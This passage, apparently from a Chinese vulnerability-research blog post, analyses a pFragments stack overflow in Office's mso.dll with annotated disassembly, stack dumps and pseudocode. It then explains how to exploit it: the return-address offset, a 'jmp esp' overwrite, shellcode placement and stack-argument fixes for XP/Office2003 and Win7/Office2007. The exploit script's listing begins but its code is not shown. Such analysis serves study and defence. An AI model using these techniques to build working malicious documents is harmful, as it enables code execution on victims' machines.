class="line">            signed <span class="keyword">int</span> __stdcall sub_3277BE91(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">        ******************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>3277BE91                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE92                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x0011B1C0</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE94                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   eax = [ebp+8] = [0x0011B1C0+8] = [0x0011B1C8] = 0x06454B30(a1)(对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE97                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]                       <span class="comment">;   ecx = [eax] = [0x06454B30] = 0x72580D38(ole32.dll中的虚表指针)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE99                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE9A                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_8]                 <span class="comment">;   esi = [ebp+0x10] = [0x0011B1C0+0x10] = [0x0011B1D0] = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE9D                 <span class="keyword">lea</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   edx = ebp+0x8 = 0x0011B1C0+0x8 = 0x0011B1C8(a1地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA0                 <span class="keyword">push</span>    <span class="built_in">edx</span>                              <span class="comment">; arg4: edx = 0x0011B1C8(a1地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA1                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">; arg3: esi = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA2                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]                      <span class="comment">; arg2: [ebp+0xC] = [0x0011B1C0+0xC] = [0x0011B1CC] = 0x1D400000(a2)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA5                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: eax = 0x06454B30(a1)(对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA6                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">0Ch</span>]              <span class="comment">; ole32.72561D9A,CMemStm::Read(void *,ulong,ulong *)</span></span><br><span class="line">                <span class="comment">; 1D400000  41 61 30 41 61 31 41 61 32 41 61 33 41 61 34 41  Aa0Aa1Aa2Aa3Aa4A</span></span><br><span class="line">                <span class="comment">; 1D400010  61 35 41 61 36 41 61 37 41 61 38 41 61 39 41 62  a5Aa6Aa7Aa8Aa9Ab</span></span><br><span class="line">                <span class="comment">; 1D400020  30 41 62 31 41 62 32 41 62 33 41 62 34 41 62 35  0Ab1Ab2Ab3Ab4Ab5</span></span><br><span class="line">                <span class="comment">; 1D400030  41 62 36 41 62 37 41 62 38 41 62 39 41 63 30 41  Ab6Ab7Ab8Ab9Ac0A</span></span><br><span class="line">                <span class="comment">; 1D400040  63 31 41 63 32 41 63 33 41 63 34 41 63 35 41 63  c1Ac2Ac3Ac4Ac5Ac</span></span><br><span class="line">                <span class="comment">; 1D400050  36 41 63 37 41 63 38 41 63 39 41 64 30 41 64 31  6Ac7Ac8Ac9Ad0Ad1</span></span><br><span class="line">                <span class="comment">; 1D400060  41 64 32 41 64 33 41 64 34 41 64 35 41 64 36 41  Ad2Ad3Ad4Ad5Ad6A</span></span><br><span class="line">                <span class="comment">; 1D400070  64 37 41 64 38 41 64 39 41 65 30 41 65 31 41 65  d7Ad8Ad9Ae0Ae1Ae</span></span><br><span class="line">                <span class="comment">; 1D400080  32 41 65 33 41 65 34 41 65 35 41 65 36 41 65 37  2Ae3Ae4Ae5Ae6Ae7</span></span><br><span class="line">                <span class="comment">; 1D400090  41 65 38 41 65 39 41 66 30 41 66 31 41 66 32 41  Ae8Ae9Af0Af1Af2A</span></span><br><span class="line">                <span class="comment">; 1D4000A0  66 33 41 66 34 41 66 35 41 66 36 41 66 37 41 66  f3Af4Af5Af6Af7Af</span></span><br><span class="line">                <span class="comment">; 1D4000B0  38 41 66 39 41 67 30 41 67 31 41 67 32 41 67 33  8Af9Ag0Ag1Ag2Ag3</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA9                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEAB                 <span class="keyword">jl</span>      loc_32CE0534                     <span class="comment">;   小于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEB1                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_0], <span class="built_in">esi</span>                 <span class="comment">;   [ebp+0x8] = [0x0011B1C0+0x8] = [0x0011B1C8] = 0x0001000D,esi = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEB4                 <span class="keyword">jnz</span>     loc_32CE053B                     <span class="comment">;   不为0跳转，这里跳转</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>32CE053B loc_32CE053B:                           </span><br><span class="line"><span class="symbol">        .text:</span>32CE053B                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0</span></span><br><span class="line"><span class="symbol">        .text:</span>32CE053D                 <span class="keyword">jmp</span>     loc_3277BEBD                     <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>3277BEBD loc_3277BEBD:                           </span><br><span class="line"><span class="symbol">        .text:</span>3277BEBD                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEBE                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEBF                 <span class="keyword">retn</span>    <span class="number">0Ch</span>                              <span class="comment">;</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141B1                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141B3                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0跳转，这里跳转</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141C5 loc_32E141C5:                       </span><br><span class="line"><span class="symbol">    .text:</span>32E141C5                                    </span><br><span class="line"><span class="symbol">    .text:</span>32E141C5                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C7                 <span class="keyword">jmp</span>     short loc_32E141BE               <span class="comment">; </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141BE loc_32E141BE:                           </span><br><span class="line"><span class="symbol">    .text:</span>32E141BE                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                              <span class="comment">;   edi = 0x00020026</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141BF                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x023A0004, (ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C0                 <span class="keyword">pop</span>     <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x02340000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C1                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C2                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;经过详细分析，我们可以看到，在<code>sub_32E14136</code>函数中三次调用<code>sub_33287CC1</code>函数，将<code>“1111”</code>、<code>“1111”</code>、<code>“C8AC”</code>分别解析出来，并对<code>先解析出来的“1111”</code>和<code>后解析出来的“1111”</code>进行比较，如果先解析出来的“1111”<code>大于</code>后解析出来的“1111”，则<code>退出</code>，不在执行后面的处理。这样看来，<code>“11111111”</code>中的<code>前4个字节</code>以<code>小端序</code>解析出来的数应该小于<code>后4个字节</code>以<code>小端序</code>解析出来的数，经过测试，<code>“11112222”</code>也是可行的。还有，在地址<code>0x32E14184</code>处的指令，将<code>复制数据长度0xC8AC</code>复制给了<code>关键对象0x066A55E0</code>的成员变量。</p><h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><h3 id="0x41-方法一：覆盖返回地址"><a href="#0x41-方法一：覆盖返回地址" class="headerlink" title="0x41 方法一：覆盖返回地址"></a>0x41 方法一：覆盖返回地址</h3><p><strong><code>环境：</code></strong>XP &amp; Office2003</p><p>&emsp;&emsp;触发异常的指令<code>“30ED442C rep movsd”</code>位于<code>sub_30ED4406</code>函数中，<code>“rep movsd”</code>指令复制内存数据时的<code>目的地址</code>，是通过<code>sub_30ED4406</code>函数的<code>第二个参数</code>传进来的，它其实是<code>sub_30ED4406</code>函数的<code>父函数sub_30F0B5C2</code>中定义的一个<code>局部变量</code>，所以<code>pFragements属性值数据</code>在<code>栈上的起始地址</code>位于父函数<code>sub_30F0B5C2</code>的<code>栈帧</code>中，我们要覆盖的也是父函数<code>sub_30F0B5C2</code>的<code>返回地址</code>。</p><p>&emsp;&emsp;根据<code>前面的分析</code>我们可以知道，当执行到指令<code>“30ED442C rep movsd”</code>处时，<code>栈布局</code>是这样的：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30ED442C F3 A5        <span class="keyword">rep</span> <span class="keyword">movsd</span>   <span class="comment">; rep movs dword ptr es:[edi],dword ptr [esi]</span></span><br><span class="line">                                    栈数据：</span><br><span class="line">                                    001237B4   01C40824 &lt;-<span class="built_in">esp</span></span><br><span class="line">                                    001237B8   001239A4</span><br><span class="line">                                    001237BC   30F0B5FB  返回到 mso.30F0B5FB</span><br><span class="line">                                    001237C0   01C40824</span><br><span class="line">                                    001237C4   001237DC</span><br><span class="line">                                    001237C8   <span class="number">00000000</span></span><br><span class="line">                                    001237CC   <span class="number">00000000</span></span><br><span class="line">                                    001237D0   <span class="number">00000000</span></span><br><span class="line">                                    001237D4   <span class="number">00000000</span></span><br><span class="line">                                    001237D8   0000FF35</span><br><span class="line">                                    001237DC   FFFF0000 &lt;-pFragments缓冲区起始地址</span><br><span class="line">                                    001237E0   <span class="number">05000000</span></span><br><span class="line">                                    001237E4   <span class="number">00000000</span></span><br><span class="line">                                    001237E8   0000FFFF</span><br><span class="line">                                    001237EC   0012381C &lt;-<span class="built_in">ebp</span></span><br><span class="line">                                    001237F0   30F0B56B  返回到 mso.30F0B56B 来自 mso.30F0B5C2</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>pFragments缓冲区</code>起始地址距保存函数<code>sub_30F0B5C2的返回地址</code>的栈地址的偏移为<code>0x14字节</code>，所以在<code>pFragments属性值</code>中的<code>复制长度</code>之后再填充<code>0x14字节</code>数据，即可覆盖到<code>返回地址</code>。我们这里使用<code>“jmp esp”</code>指令的地址覆盖其<code>返回地址</code>。由于函数<code>sub_30F0B5C2</code>在返回时，会<code>弹出0x14字节</code>的栈空间，所以，返回地址之后不能直接放置<code>Shellcode</code>，需要填充<code>0x14</code>字节的<code>垃圾数据</code>，然后再放置<code>Shellcode</code>。这样，执行<code>“jmp esp”</code>指令的时候，就可以直接跳转到<code>Shellcode</code>执行了。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30F0B6B8 loc_30F0B6B8:                           <span class="comment">; CODE XREF: sub_30F0B5C2+184C37↓j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6B8         <span class="keyword">pop</span>     <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6B9         <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6BA         <span class="keyword">retn</span>    <span class="number">14h</span> &lt;----</span><br><span class="line"><span class="symbol">.text:</span>30F0B6BA sub_30F0B5C2 endp</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在写<code>Exp</code>的过程中，遇到一个问题。由于复制数据指令<code>“30ED442C rep movsd”</code>的位置距离函数<code>sub_30F0B5C2</code>的返回指令<code>&quot;30F0B6BA retn 14h&quot;</code>还有很多指令需要执行，但是<code>栈</code>已经<code>被破坏</code>了，所以可能会造成这些指令<code>执行异常</code>，我们需要构造<code>关键的数据</code>，使其可以成功执行到函数<code>sub_30F0B5C2</code>的返回指令<code>&quot;30F0B6BA retn 14h&quot;</code>。这些指令会访问调用函数<code>sub_30F0B5C2</code>时，压入栈的<code>参数</code>，也就是我们覆盖的函数<code>sub_30F0B5C2</code>的<code>返回地址</code>之后的<code>0x14字节</code>栈空间。如果我们全用<code>“a”</code>覆盖这片栈空间，就会<code>造成异常</code>，异常信息如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    所属模块: mso.dll</span><br><span class="line">    char __userpurge sub_30F0B5C2@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>30F0B5F8         <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>]              <span class="comment">;   sub_30ED4406</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5FB         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]                 <span class="comment">;   eax = [ebp+0x14] = 0x001237ec+0x14] = [0x00123800] = 0xAAAAAAAA(a4)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5FE         <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]                     <span class="comment">; arg3: [ebp+0x18] = 0x001237ec+0x18] = [0x00123804] = 0xAAAAAAAA(a5)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B601         <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+var_10]                <span class="comment">;   edx = [ebp-0x10] = [0x001237ec-0x10] = [0x001237dc] = 0xAAAAAAAA(pFragements属性值起始内容) &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B604         <span class="keyword">neg</span>     <span class="built_in">eax</span>                              <span class="comment">;   求补:按位取反再加一,eax = 0x55555556</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B606         <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = eax-eax-CF = 0xFFFFFFFF,CF=1</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B608         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   ecx = ebp-0x8 = 0x001237ec-0x8 = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60B         <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>                         <span class="comment">;   eax = eax&amp;ecx = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60D         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60E         <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]                      <span class="comment">; arg1: [ebp+0x8] = [0x001237ec+0x8] = [0x001237f4] = 0xAAAAAAAA(a1)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B611         <span class="keyword">call</span>    sub_30F0B7AF                     <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B616         <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B618         <span class="keyword">jz</span>      loc_30F0B6B6</span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    **********************************************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        char __userpurge sub_30F0B7AF@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">edx</span>&gt;, <span class="keyword">int</span> a2@&lt;<span class="built_in">edi</span>&gt;, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line"></span><br><span class="line">    **********************************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>30F0B7AF         <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x001237EC</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B0         <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x001237B8</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B2         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">10h</span>                         <span class="comment">;   esp = esp-0x10 = 0x001237B8-0x10 = 0x001237A8</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B5         <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B6         <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                         <span class="comment">;   ebx = ebx^ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B8         <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="built_in">ebx</span>                 <span class="comment">;   [ebp+0x10] = [0x001237B8+0x10] = [0x001237C8] = 0xAAAAAAAA(a3)</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7BB         <span class="keyword">jz</span>      loc_310901D0                     <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C1         <span class="keyword">cmp</span>     <span class="built_in">edx</span>, <span class="built_in">ebx</span>                         <span class="comment">; arg2: edx = 0xAAAAAAAA,ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C3         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+lpMem], <span class="built_in">ebx</span>                 <span class="comment">;   [ebp-0xC] = [0x001237B8-0xC] = [0x001237AC] = ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C6         <span class="keyword">jz</span>      short loc_30F0B7D8               <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C8         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+lpMem]                 <span class="comment">; arg1: ecx = ebp-0xc = 0x001237B8-0xC = 0x001237AC</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7CB         <span class="keyword">call</span>    sub_30F0B90A                     <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        **************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __fastcall sub_30F0B90A(LPVOID *a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">        **************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A sub_30F0B90A proc <span class="built_in">near</span>                </span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A                                        </span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A         <span class="keyword">lea</span>     <span class="built_in">eax</span>, (loc_30F0B914+<span class="number">4</span>)[<span class="built_in">edx</span>*<span class="number">8</span>]     <span class="comment">; eax = edx*8+0x30F0B914+4 = 0xAAAAAAAA*8+0x30F0B918 = 0x86460E68(a2,edx) &lt;----</span></span><br><span class="line"><span class="symbol">        .text:</span>30F0B911         <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">eax</span>+<span class="number">4</span>]                     <span class="comment">; edx = [eax+4] = [0x86460E68+4] = [0x86460E6C] = ??? &lt;----</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于<code>pFragements属性值</code>起始的<code>第1个dword</code>会被传进调用<code>CrashFun(sub_30ED4406)</code>函数的指令之后调用的<code>sub_30F0B7AF函数</code>，作为其<code>参数</code>，后面的程序会利用其生成一个<code>不可访问的地址</code>，造成<code>内存访问异常</code>。</p><p>&emsp;&emsp;经过对函数<code>sub_30F0B5C2</code>和函数<code>sub_30F0B7AF</code>的伪代码进行分析，结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __userpurge sub_30F0B5C2@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 ) <span class="comment">// 进入sub_30F0B5C2函数时,a6 != 0x0</span></span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(<span class="keyword">int</span> **)(sub_30D29EA3(*(_BYTE **)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v8 = *v7;</span><br><span class="line">        v16 = <span class="number">83886080</span>;</span><br><span class="line">        (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(v8 + <span class="number">28</span>))(v7, &amp;v15, a3); <span class="comment">// sub_30ED4406,a6可被修改为0x0</span></span><br><span class="line">        <span class="comment">// a6 == 0x0,会使sub_30F0B7AF()函数返回0,a6为sub_30F0B5C2()在栈上的第5个参数</span></span><br><span class="line">        <span class="comment">// 并且可以使sub_30F0B5C2()函数直接返回</span></span><br><span class="line">        result = sub_30F0B7AF(a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17 : <span class="number">0</span>, a6); </span><br><span class="line">        <span class="keyword">if</span> ( result ) <span class="comment">// result == 0x0,sub_30F0B5C2()函数直接返回</span></span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_3144D83D();</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_30F0B7AF@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;edx&gt;, <span class="keyword">int</span> a2@&lt;edi&gt;, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( !a5 ) <span class="comment">// a5 == 0x0,则直接返回,且返回值为0</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_3144D83D();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;所以我们只要让函数<code>sub_30F0B5C2</code>在<code>栈</code>上的<code>第5个参数</code>被修改为<code>0x0</code>,则可以让函数<code>sub_30F0B5C2</code>跳过执行完<code>CrashFun(sub_30ED4406)</code>函数之后可能需要执行的代码部分，<code>直接返回</code>。</p><p><strong><code>环境：</code></strong>Windows7 &amp; Office2007</p><p>&emsp;&emsp;在<code>Win7&amp;Office2007</code>的环境下，和<code>XP&amp;Office2003</code>环境下，基本是一样的，只是<code>关键函数</code>的地址不一样。<code>对应关系</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+--------------------+-------------------+</span><br><span class="line">|   XP&amp;Office2003     |   sub_30F0B5C2     |   sub_30F0B7AF    |</span><br><span class="line">|---------------------|--------------------|-------------------|</span><br><span class="line">|   Win7&amp;Office2007   |   sub_32E5955E     |   sub_32E5941B    |</span><br><span class="line">+---------------------+--------------------+-------------------+</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;还有就是所使用的<code>ROPGadgets</code>的地址不一样，也有可能<code>ROPGadgets</code>的地址是相同的，这种比较少。</p><p><strong><code>Exp:</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 